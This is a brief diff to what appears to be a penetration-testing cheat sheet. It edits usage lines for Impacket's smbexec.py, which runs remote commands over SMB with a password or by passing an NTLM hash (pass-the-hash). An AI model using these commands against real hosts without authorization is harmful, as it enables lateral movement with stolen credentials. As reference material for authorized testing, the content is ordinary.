@@ -2,5 +2,5 @@
 python smbexec.py <domain>/<user>:<password>@<rhost>
 
 # using hash
-python smbexec.py -hashes <hash> <domain>/<user>@<rhost>
+python smbexec.py -hashes :<ntlmHash> <domain>/<user>@<rhost>
 
